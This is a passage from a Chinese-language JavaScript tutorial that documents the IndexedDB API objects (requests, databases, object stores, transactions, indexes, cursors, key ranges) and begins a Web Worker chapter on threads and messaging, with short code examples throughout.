   -  ``IDBRequest.readyState`` ：等于 ``pending`` 表示操作正在进行，等于 ``done`` 表示操作正在完成。
   -  ``IDBRequest.result`` ：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。
   -  ``IDBRequest.error`` ：请求失败时，返回错误对象。
   -  ``IDBRequest.source`` ：返回请求的来源（比如索引对象或 ObjectStore）。
   -  ``IDBRequest.transaction`` ：返回当前请求正在进行的事务，如果不包含事务，返回 ``null`` 。
   -  ``IDBRequest.onsuccess`` ：指定 ``success`` 事件的监听函数。
   -  ``IDBRequest.onerror`` ：指定 ``error`` 事件的监听函数。

   IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。

   -  ``IDBOpenDBRequest.onblocked`` ：指定 ``blocked`` 事件（ ``upgradeneeded`` 事件触发时，数据库仍然在使用）的监听函数。
   -  ``IDBOpenDBRequest.onupgradeneeded`` ： ``upgradeneeded`` 事件的监听函数。

IDBDatabase 对象
---------------

   打开数据成功以后，可以从 ``IDBOpenDBRequest`` 对象的 ``result`` 属性上面，拿到一个 ``IDBDatabase`` 对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。

   .. code:: javascript

      var db;
      var DBOpenRequest = window.indexedDB.open('demo', 1);
   
      DBOpenRequest.onerror = function (event) {
        console.log('Error');
      };
   
      DBOpenRequest.onsuccess = function(event) {
        db = DBOpenRequest.result;
        // ...
      };

属性
~~~

   IDBDatabase 对象有以下属性。

   -  ``IDBDatabase.name`` ：字符串，数据库名称。
   -  ``IDBDatabase.version`` ：整数，数据库版本。数据库第一次创建时，该属性为空字符串。
   -  ``IDBDatabase.objectStoreNames`` ：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。
   -  ``IDBDatabase.onabort`` ：指定 abort 事件（事务中止）的监听函数。
   -  ``IDBDatabase.onclose`` ：指定 close 事件（数据库意外关闭）的监听函数。
   -  ``IDBDatabase.onerror`` ：指定 error 事件（访问数据库失败）的监听函数。
   -  ``IDBDatabase.onversionchange`` ：数据库版本变化时触发（发生 ``upgradeneeded`` 事件，或调用 ``indexedDB.deleteDatabase()`` ）。

   下面是 ``objectStoreNames`` 属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的 ``contains`` 方法，检查数据库是否包含某个对象仓库。

   .. code:: javascript

      if (!db.objectStoreNames.contains('firstOS')) {
        db.createObjectStore('firstOS');
      }

   上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。

方法
~~~

   IDBDatabase 对象有以下方法。

   -  ``IDBDatabase.close()`` ：关闭数据库连接，实际会等所有事务完成后再关闭。
   -  ``IDBDatabase.createObjectStore()`` ：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在 ``versionchange`` 事件监听函数中调用。
   -  ``IDBDatabase.deleteObjectStore()`` ：删除指定的对象仓库。该方法只能在 ``versionchange`` 事件监听函数中调用。
   -  ``IDBDatabase.transaction()`` ：返回一个 IDBTransaction 事务对象。

   下面是 ``createObjectStore()`` 方法的例子。

   .. code:: javascript

      var request = window.indexedDB.open('demo', 2);
   
      request.onupgradeneeded = function (event) {
        var db = event.target.result;
   
        db.onerror = function(event) {
          console.log('error');
        };
   
        var objectStore = db.createObjectStore('items');
   
        // ...
      };

   上面代码创建了一个名为 ``items`` 的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的 ``objectStoreNames`` 属性，检查已有哪些对象仓库。

    ``createObjectStore()`` 方法还可以接受第二个对象参数，用来设置对象仓库的属性。

   .. code:: javascript

      db.createObjectStore('test', { keyPath: 'email' });
      db.createObjectStore('test2', { autoIncrement: true });

   上面代码中， ``keyPath`` 属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的 ``email`` 属性值都是不一样的），默认值为 ``null`` ； ``autoIncrement`` 属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为 ``false`` 。一般来说， ``keyPath`` 和 ``autoIncrement`` 属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少 ``keyPath`` 指定的属性。

   下面是 ``deleteObjectStore()`` 方法的例子。

   .. code:: javascript

      var dbName = 'sampleDB';
      var dbVersion = 2;
      var request = indexedDB.open(dbName, dbVersion);
   
      request.onupgradeneeded = function(e) {
        var db = request.result;
        if (e.oldVersion < 1) {
          db.createObjectStore('store1');
        }
   
        if (e.oldVersion < 2) {
          db.deleteObjectStore('store1');
          db.createObjectStore('store2');
        }
   
        // ...
      };

   下面是 ``transaction()`` 方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。

   .. code:: javascript

      var t = db.transaction(['items'], 'readwrite');

    ``transaction()`` 方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种： ``readonly`` （只读）和 ``readwrite`` （读写）。添加数据使用 ``readwrite`` ，读取数据使用 ``readonly`` 。第二个参数是可选的，省略时默认为 ``readonly`` 模式。

IDBObjectStore 对象
-------------------

   IDBObjectStore 对象对应一个对象仓库（object store）。 ``IDBDatabase.createObjectStore()`` 方法返回的就是一个 IDBObjectStore 对象。

   IDBDatabase 对象的 ``transaction()`` 返回一个事务对象，该对象的 ``objectStore()`` 方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。

   .. code:: javascript

      db.transaction(['test'], 'readonly')
        .objectStore('test')
        .get(X)
        .onsuccess = function (e) {}

属性
~~~

   IDBObjectStore 对象有以下属性。

   -  ``IDBObjectStore.indexNames`` ：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。
   -  ``IDBObjectStore.keyPath`` ：返回当前对象仓库的主键。
   -  ``IDBObjectStore.name`` ：返回当前对象仓库的名称。
   -  ``IDBObjectStore.transaction`` ：返回当前对象仓库所属的事务对象。
   -  ``IDBObjectStore.autoIncrement`` ：布尔值，表示主键是否会自动递增。

方法
~~~

   IDBObjectStore 对象有以下方法。

   **（1）IDBObjectStore.add()**

    ``IDBObjectStore.add()`` 用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用 ``put()`` 方法。

   .. code:: javascript

      objectStore.add(value, key)

   该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为 ``null`` 。

   创建事务以后，就可以获取对象仓库，然后使用 ``add()`` 方法往里面添加数据了。

   .. code:: javascript

      var db;
      var DBOpenRequest = window.indexedDB.open('demo', 1);
   
      DBOpenRequest.onsuccess = function (event) {
        db = DBOpenRequest.result;
        var transaction = db.transaction(['items'], 'readwrite');
   
        transaction.oncomplete = function (event) {
          console.log('transaction success');
        };
   
        transaction.onerror = function (event) {
          console.log('transaction error: ' + transaction.error);
        };
   
        var objectStore = transaction.objectStore('items');
        var objectStoreRequest = objectStore.add({ foo: 1 });
   
        objectStoreRequest.onsuccess = function (event) {
          console.log('add data success');
        };
   
      };

   **（2）IDBObjectStore.put()**

    ``IDBObjectStore.put()`` 方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      objectStore.put(item, key)

   该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。

   **（3）IDBObjectStore.clear()**

    ``IDBObjectStore.clear()`` 删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      objectStore.clear()

   该方法不需要参数。

   **（4）IDBObjectStore.delete()**

    ``IDBObjectStore.delete()`` 方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      objectStore.delete(Key)

   该方法的参数为主键的值。

   **（5）IDBObjectStore.count()**

    ``IDBObjectStore.count()`` 方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      IDBObjectStore.count(key)

   不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。

   **（6）IDBObjectStore.getKey()**

    ``IDBObjectStore.getKey()`` 用于获取主键。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      objectStore.getKey(key)

   该方法的参数可以是主键值或 IDBKeyRange 对象。

   **（7）IDBObjectStore.get()**

    ``IDBObjectStore.get()`` 用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      objectStore.get(key)

   **（8）IDBObjectStore.getAll()**

    ``DBObjectStore.getAll()`` 用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      // 获取所有记录
      objectStore.getAll()
   
      // 获取所有符合指定主键或 IDBKeyRange 的记录
      objectStore.getAll(query)
   
      // 指定获取记录的数量
      objectStore.getAll(query, count)

   **（9）IDBObjectStore.getAllKeys()**

    ``IDBObjectStore.getAllKeys()`` 用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。

   .. code:: javascript

      // 获取所有记录的主键
      objectStore.getAllKeys()
   
      // 获取所有符合条件的主键
      objectStore.getAllKeys(query)
   
      // 指定获取主键的数量
      objectStore.getAllKeys(query, count)

   **（10）IDBObjectStore.index()**

    ``IDBObjectStore.index()`` 方法返回指定名称的索引对象 IDBIndex。

   .. code:: javascript

      objectStore.index(name)

   有了索引以后，就可以针对索引所在的属性读取数据。

   .. code:: javascript

      var t = db.transaction(['people'], 'readonly');
      var store = t.objectStore('people');
      var index = store.index('name');
   
      var request = index.get('foo');

   上面代码打开对象仓库以后，先用 ``index()`` 方法指定获取 ``name`` 属性的索引，然后用 ``get()`` 方法读取某个 ``name`` 属性( ``foo`` )对应的数据。如果 ``name`` 属性不是对应唯一值，这时 ``get()`` 方法有可能取回多个数据对象。另外， ``get()`` 是异步方法，读取成功以后，只能在 ``success`` 事件的监听函数中处理数据。

   **（11）IDBObjectStore.createIndex()**

    ``IDBObjectStore.createIndex()`` 方法用于新建当前数据库的一个索引。该方法只能在 ``VersionChange`` 监听函数里面调用。

   .. code:: javascript

      objectStore.createIndex(indexName, keyPath, objectParameters)

   该方法可以接受三个参数。

   - indexName：索引名
   - keyPath：主键
   - objectParameters：配置对象（可选）

   第三个参数可以配置以下属性。

   - unique：如果设为 ``true`` ，将不允许重复的值
   - multiEntry：如果设为 ``true`` ，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。

   假定对象仓库中的数据记录都是如下的 ``person`` 类型。

   .. code:: javascript

      var person = {
        name: name,
        email: email,
        created: new Date()
      };

   可以指定这个对象的某个属性来建立索引。

   .. code:: javascript

      var store = db.createObjectStore('people', { autoIncrement: true });
   
      store.createIndex('name', 'name', { unique: false });
      store.createIndex('email', 'email', { unique: true });

   上面代码告诉索引对象， ``name`` 属性不是唯一值， ``email`` 属性是唯一值。

   **（12）IDBObjectStore.deleteIndex()**

    ``IDBObjectStore.deleteIndex()`` 方法用于删除指定的索引。该方法只能在 ``VersionChange`` 监听函数里面调用。

   .. code:: javascript

      objectStore.deleteIndex(indexName)

   **（13）IDBObjectStore.openCursor()**

    ``IDBObjectStore.openCursor()`` 用于获取一个指针对象。

   .. code:: javascript

      IDBObjectStore.openCursor()

   指针对象可以用来遍历数据。该对象也是异步的，有自己的 ``success`` 和 ``error`` 事件，可以对它们指定监听函数。

   .. code:: javascript

      var t = db.transaction(['test'], 'readonly');
      var store = t.objectStore('test');
   
      var cursor = store.openCursor();
   
      cursor.onsuccess = function (event) {
        var res = event.target.result;
        if (res) {
          console.log('Key', res.key);
          console.dir('Data', res.value);
          res.continue();
        }
      }

   监听函数接受一个事件对象作为参数，该对象的 ``target.result`` 属性指向当前数据记录。该记录的 ``key`` 和 ``value`` 分别返回主键和键值（即实际存入的数据）。 ``continue()`` 方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向 ``null`` 。

    ``openCursor()`` 方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为 ``next`` ，其他可能的值为 ``prev`` 、 ``nextunique`` 和 ``prevunique`` 。后两个值表示如果遇到重复值，会自动跳过。

   **（14）IDBObjectStore.openKeyCursor()**

    ``IDBObjectStore.openKeyCursor()`` 用于获取一个主键指针对象。

   .. code:: javascript

      IDBObjectStore.openKeyCursor()

IDBTransaction 对象
-------------------

   IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。

    ``IDBDatabase.transaction()`` 方法返回的就是一个 IDBTransaction 对象。

   .. code:: javascript

      var db;
      var DBOpenRequest = window.indexedDB.open('demo', 1);
   
      DBOpenRequest.onsuccess = function(event) {
        db = DBOpenRequest.result;
        var transaction = db.transaction(['demo'], 'readwrite');
   
        transaction.oncomplete = function (event) {
          console.log('transaction success');
        };
   
        transaction.onerror = function (event) {
          console.log('transaction error: ' + transaction.error);
        };
   
        var objectStore = transaction.objectStore('demo');
        var objectStoreRequest = objectStore.add({ foo: 1 });
   
        objectStoreRequest.onsuccess = function (event) {
          console.log('add data success');
        };
   
      };

   事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。

   .. code:: javascript

      var trans1 = db.transaction('foo', 'readwrite');
      var trans2 = db.transaction('foo', 'readwrite');
      var objectStore2 = trans2.objectStore('foo')
      var objectStore1 = trans1.objectStore('foo')
      objectStore2.put('2', 'key');
      objectStore1.put('1', 'key');

   上面代码中， ``key`` 对应的键值最终是 ``2`` ，而不是 ``1`` 。因为事务 ``trans1`` 先于 ``trans2`` 创建，所以首先执行。

   注意，事务有可能失败，只有监听到事务的 ``complete`` 事件，才能保证事务操作成功。

   IDBTransaction 对象有以下属性。

   -  ``IDBTransaction.db`` ：返回当前事务所在的数据库对象 IDBDatabase。
   -  ``IDBTransaction.error`` ：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回 ``null`` 。
   -  ``IDBTransaction.mode`` ：返回当前事务的模式，默认是 ``readonly`` （只读），另一个值是 ``readwrite`` 。
   -  ``IDBTransaction.objectStoreNames`` ：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。
   -  ``IDBTransaction.onabort`` ：指定 ``abort`` 事件（事务中断）的监听函数。
   -  ``IDBTransaction.oncomplete`` ：指定 ``complete`` 事件（事务成功）的监听函数。
   -  ``IDBTransaction.onerror`` ：指定 ``error`` 事件（事务失败）的监听函数。

   IDBTransaction 对象有以下方法。

   -  ``IDBTransaction.abort()`` ：终止当前事务，回滚所有已经进行的变更。
   -  ``IDBTransaction.objectStore(name)`` ：返回指定名称的对象仓库 IDBObjectStore。

IDBIndex 对象
------------

   IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。

   IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。

    ``IDBObjectStore.index()`` 方法可以获取 IDBIndex 对象。

   .. code:: javascript

      var transaction = db.transaction(['contactsList'], 'readonly');
      var objectStore = transaction.objectStore('contactsList');
      var myIndex = objectStore.index('lName');
   
      myIndex.openCursor().onsuccess = function (event) {
        var cursor = event.target.result;
        if (cursor) {
          var tableRow = document.createElement('tr');
          tableRow.innerHTML =   '<td>' + cursor.value.id + '</td>'
                               + '<td>' + cursor.value.lName + '</td>'
                               + '<td>' + cursor.value.fName + '</td>'
                               + '<td>' + cursor.value.jTitle + '</td>'
                               + '<td>' + cursor.value.company + '</td>'
                               + '<td>' + cursor.value.eMail + '</td>'
                               + '<td>' + cursor.value.phone + '</td>'
                               + '<td>' + cursor.value.age + '</td>';
          tableEntry.appendChild(tableRow);
   
          cursor.continue();
        } else {
          console.log('Entries all displayed.');
        }
      };

   IDBIndex 对象有以下属性。

   -  ``IDBIndex.name`` ：字符串，索引的名称。
   -  ``IDBIndex.objectStore`` ：索引所在的对象仓库。
   -  ``IDBIndex.keyPath`` ：索引的主键。
   -  ``IDBIndex.multiEntry`` ：布尔值，针对 ``keyPath`` 为数组的情况，如果设为 ``true`` ，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。
   -  ``IDBIndex.unique`` ：布尔值，表示创建索引时是否允许相同的主键。

   IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。

   -  ``IDBIndex.count()`` ：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。
   -  ``IDBIndex.get(key)`` ：用来获取符合指定主键的数据记录。
   -  ``IDBIndex.getKey(key)`` ：用来获取指定的主键。
   -  ``IDBIndex.getAll()`` ：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。
   -  ``IDBIndex.getAllKeys()`` ：该方法与 ``IDBIndex.getAll()`` 方法相似，区别是获取所有主键。
   -  ``IDBIndex.openCursor()`` ：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。
   -  ``IDBIndex.openKeyCursor()`` ：该方法与 ``IDBIndex.openCursor()`` 方法相似，区别是遍历所有条目的主键。

IDBCursor 对象
--------------

   IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。

   IDBCursor 对象一般通过 ``IDBObjectStore.openCursor()`` 方法获得。

   .. code:: javascript

      var transaction = db.transaction(['rushAlbumList'], 'readonly');
      var objectStore = transaction.objectStore('rushAlbumList');
   
      objectStore.openCursor(null, 'next').onsuccess = function(event) {
        var cursor = event.target.result;
        if (cursor) {
          var listItem = document.createElement('li');
          listItem.innerHTML = cursor.value.albumTitle + ', ' + cursor.value.year;
          list.appendChild(listItem);
   
          console.log(cursor.source);
          cursor.continue();
        } else {
          console.log('Entries all displayed.');
        }
      };

   IDBCursor 对象的属性。

   -  ``IDBCursor.source`` ：返回正在遍历的对象仓库或索引。
   -  ``IDBCursor.direction`` ：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过 ``IDBObjectStore.openCursor()`` 方法的第二个参数指定，一旦指定就不能改变了。
   -  ``IDBCursor.key`` ：返回当前记录的主键。
   -  ``IDBCursor.value`` ：返回当前记录的数据值。
   -  ``IDBCursor.primaryKey`` ：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。

   IDBCursor 对象有如下方法。

   -  ``IDBCursor.advance(n)`` ：指针向前移动 n 个位置。
   -  ``IDBCursor.continue()`` ：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。
   -  ``IDBCursor.continuePrimaryKey()`` ：该方法需要两个参数，第一个是 ``key`` ，第二个是 ``primaryKey`` ，将指针移到符合这两个参数的位置。
   -  ``IDBCursor.delete()`` ：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。
   -  ``IDBCursor.update()`` ：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。

IDBKeyRange 对象
---------------

   IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。

   IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。

   -  ``IDBKeyRange.lowerBound()`` ：指定下限。
   -  ``IDBKeyRange.upperBound()`` ：指定上限。
   -  ``IDBKeyRange.bound()`` ：同时指定上下限。
   -  ``IDBKeyRange.only()`` ：指定只包含一个值。

   下面是一些代码实例。

   .. code:: javascript

      // All keys ≤ x
      var r1 = IDBKeyRange.upperBound(x);
   
      // All keys < x
      var r2 = IDBKeyRange.upperBound(x, true);
   
      // All keys ≥ y
      var r3 = IDBKeyRange.lowerBound(y);
   
      // All keys > y
      var r4 = IDBKeyRange.lowerBound(y, true);
   
      // All keys ≥ x && ≤ y
      var r5 = IDBKeyRange.bound(x, y);
   
      // All keys > x &&< y
      var r6 = IDBKeyRange.bound(x, y, true, true);
   
      // All keys > x && ≤ y
      var r7 = IDBKeyRange.bound(x, y, true, false);
   
      // All keys ≥ x &&< y
      var r8 = IDBKeyRange.bound(x, y, false, true);
   
      // The key = z
      var r9 = IDBKeyRange.only(z);

    ``IDBKeyRange.lowerBound()`` 、 ``IDBKeyRange.upperBound()`` 、 ``IDBKeyRange.bound()`` 这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。

   与之对应，IDBKeyRange 对象有四个只读属性。

   -  ``IDBKeyRange.lower`` ：返回下限
   -  ``IDBKeyRange.lowerOpen`` ：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）
   -  ``IDBKeyRange.upper`` ：返回上限
   -  ``IDBKeyRange.upperOpen`` ：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）

   IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的 ``openCursor()`` 方法，就可以在所设定的范围内读取数据。

   .. code:: javascript

      var t = db.transaction(['people'], 'readonly');
      var store = t.objectStore('people');
      var index = store.index('name');
   
      var range = IDBKeyRange.bound('B', 'D');
   
      index.openCursor(range).onsuccess = function (e) {
        var cursor = e.target.result;
        if (cursor) {
          console.log(cursor.key + ':');
   
          for (var field in cursor.value) {
            console.log(cursor.value[field]);
          }
          cursor.continue();
        }
      }

   IDBKeyRange 有一个实例方法 ``includes(key)`` ，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。

   .. code:: javascript

      var keyRangeValue = IDBKeyRange.bound('A', 'K', false, false);
   
      keyRangeValue.includes('F') // true
      keyRangeValue.includes('W') // false

参考链接
-------

   - Raymond Camden, [Working With IndexedDB – Part 1](http://net.tutsplus.com/tutorials/javascript-ajax/working-with-indexeddb/)
   - Raymond Camden, [Working With IndexedDB – Part 2](http://net.tutsplus.com/tutorials/javascript-ajax/working-with-indexeddb-part-2/)
   - Raymond Camden, [Working With IndexedDB - Part 3](https://code.tutsplus.com/tutorials/working-with-indexeddb-part-3--net-36220)
   - Tiffany Brown, [An Introduction to IndexedDB](http://dev.opera.com/articles/introduction-to-indexeddb/)
   - David Fahlander, [Breaking the Borders of IndexedDB](https://hacks.mozilla.org/2014/06/breaking-the-borders-of-indexeddb/)
   - TutorialsPoint, [HTML5 - IndexedDB](https://www.tutorialspoint.com/html5/html5_indexeddb.htm)

/🟠 Web Worker
===============

概述
---

   JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。

   Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。

   Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。

   Web Worker 有以下几个使用注意点。

   （1）**同源限制**

   分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。

   （2）**DOM 限制**

   Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用 ``document`` 、 ``window`` 、 ``parent`` 这些对象。但是，Worker 线程可以使用 ``navigator`` 对象和 ``location`` 对象。

   （3）**全局对象限制**

   Worker 的全局对象 ``WorkerGlobalScope`` ，不同于网页的全局对象 ``Window`` ，很多接口拿不到。比如，理论上 Worker 线程不能使用 ``console.log`` ，因为标准里面没有提到 Worker 的全局对象存在 ``console`` 接口，只定义了 ``Navigator`` 接口和 ``Location`` 接口。不过，浏览器实际上支持 Worker 线程使用 ``console.log`` ，保险的做法还是不使用这个方法。

   （4）**通信联系**

   Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。

   （5）**脚本限制**

   Worker 线程不能执行 ``alert()`` 方法和 ``confirm()`` 方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。

   （6）**文件限制**

   Worker 线程无法读取本地文件，即不能打开本机的文件系统（ ``file://`` ），它所加载的脚本，必须来自网络。

基本用法
-------


主线程
~~~~~

   主线程采用 ``new`` 命令，调用 ``Worker()`` 构造函数，新建一个 Worker 线程。

   .. code:: javascript

      var worker = new Worker('work.js');

    ``Worker()`` 构造函数的参数是一个脚本文件，该文件就是 Worker 线程所要执行的任务。由于 Worker 不能读取本地文件，所以这个脚本必须来自网络。如果下载没有成功（比如404错误），Worker 就会默默地失败。

   然后，主线程调用 ``worker.postMessage()`` 方法，向 Worker 发消息。

   .. code:: javascript

      worker.postMessage('Hello World');
      worker.postMessage({method: 'echo', args: ['Work']});

    ``worker.postMessage()`` 方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。

   接着，主线程通过 ``worker.onmessage`` 指定监听函数，接收子线程发回来的消息。

   .. code:: javascript

      worker.onmessage = function (event) {
        doSomething(event.data);
      }
   
      function doSomething() {
        // 执行任务
        worker.postMessage('Work done!');
      }

   上面代码中，事件对象的 ``data`` 属性可以获取 Worker 发来的数据。

   Worker 完成任务以后，主线程就可以把它关掉。

   .. code:: javascript

      worker.terminate();

Worker 线程
~~~~~~~~~~

   Worker 线程内部需要有一个监听函数，监听 ``message`` 事件。

   .. code:: javascript

      self.addEventListener('message', function (e) {
        self.postMessage('You said: ' + e.data);
      }, false);

   上面代码中， ``self`` 代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。

   .. code:: javascript

      // 写法一
      this.addEventListener('message', function (e) {
        this.postMessage('You said: ' + e.data);
      }, false);
   
      // 写法二
      addEventListener('message', function (e) {
        postMessage('You said: ' + e.data);
      }, false);

   除了使用 ``self.addEventListener()`` 指定监听函数，也可以使用 ``self.onmessage`` 指定。监听函数的参数是一个事件对象，它的 ``data`` 属性包含主线程发来的数据。 ``self.postMessage()`` 方法用来向主线程发送消息。

   根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。

   .. code:: javascript

      self.addEventListener('message', function (e) {
        var data = e.data;
        switch (data.cmd) {
          case 'start':
            self.postMessage('WORKER STARTED: ' + data.msg);
            break;
          case 'stop':
            self.postMessage('WORKER STOPPED: ' + data.msg);
            self.close(); // Terminates the worker.
            break;
          default:
            self.postMessage('Unknown command: ' + data.msg);
        };
      }, false);

   上面代码中， ``self.close()`` 用于在 Worker 内部关闭自身。

Worker 加载脚本
~~~~~~~~~~~~~~

   Worker 内部如果要加载其他脚本，有一个专门的方法 ``importScripts()`` 。

   .. code:: javascript

      importScripts('script1.js');

   该方法可以同时加载多个脚本。

   .. code:: javascript

      importScripts('script1.js', 'script2.js');

错误处理
~~~~~~~

   主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的 ``error`` 事件。

   .. code:: javascript

      worker.onerror = function (event) {
        console.log(
          'ERROR: Line ', event.lineno, ' in ', event.filename, ': ', event.message
        );
      };
   
      // 或者
      worker.addEventListener('error', function (event) {
        // ...
      });

   Worker 内部也可以监听 ``error`` 事件。

关闭 Worker
~~~~~~~~~~~

   使用完毕，为了节省系统资源，必须关闭 Worker。

   .. code:: javascript

      // 主线程
      worker.terminate();
   
      // Worker 线程
      self.close();

数据通信
-------

   前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。

   主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。

   .. code:: javascript

      // 主线程
      var uInt8Array = new Uint8Array(new ArrayBuffer(10));
      for (var i = 0; i < uInt8Array.length; ++i) {
        uInt8Array[i] = i * 2; // [0, 2, 4, 6, 8,...]
      }
      worker.postMessage(uInt8Array);
   
      // Worker 线程
      self.onmessage = function (e) {
        var uInt8Array = e.data;
        postMessage('Inside worker.js: uInt8Array.toString() = ' + uInt8Array.toString());
        postMessage('Inside worker.js: uInt8Array.byteLength = ' + uInt8Array.byteLength);
      };

   但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做[Transferable Objects](http://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects)。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。

   如果要直接转移数据的控制权，就要使用下面的写法。

   .. code:: javascript

      // Transferable Objects 格式
      worker.postMessage(arrayBuffer, [arrayBuffer]);
   
      // 例子
      var ab = new ArrayBuffer(1);
      worker.postMessage(ab, [ab]);

同页面的 Web Worker
------------------

